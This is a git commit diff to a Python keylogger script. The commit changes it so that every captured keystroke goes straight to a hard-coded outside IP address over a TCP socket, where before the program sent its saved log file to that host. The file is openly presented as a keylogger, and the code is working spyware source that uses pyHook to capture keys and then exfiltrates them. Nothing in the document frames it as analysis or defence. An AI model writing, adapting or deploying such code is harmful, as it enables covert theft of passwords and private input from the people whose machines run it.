71079f09b18ed56b2338236efb121ebd02bd55ca
Hui Wah Chiang <hwwc518@gmail.com>
2016-05-12 12:05:44 -0400

    Changes so keylogger sends file after creating it

--- Keylogger/keylogger.py
+++ Keylogger/keylogger.py
@@ -1,10 +1,16 @@
-import sys, pyHook, pythoncom, logging
+import sys, pyHook, pythoncom, logging, socket
 
 file_log = "keylog.txt"
 
 def OnKeyboardEvent(event):
     logging .basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
     chr(event.Ascii)
+    strf = str(chr(event.Ascii))
+    print(strf)
+    eggs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    eggs.connect(('107.170.79.196', 9010))
+    eggs.sendall(strf)
+
     logging.log(10,chr(event.Ascii))
     return True
 
@@ -12,14 +18,4 @@ hooks_manager = pyHook.HookManager ()
 hooks_manager.KeyDown = OnKeyboardEvent
 hooks_manager.HookKeyboard()
 pythoncom.PumpMessages()
-if event.Ascii == 5:
-    sys.exit()
 
-f = open('keylog.txt', 'r')
-strf = str(f.read())
-print(strf)
-eggs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-eggs.connect(('107.170.79.196', 9010))
-eggs.sendall(strf)
-
-print("done")
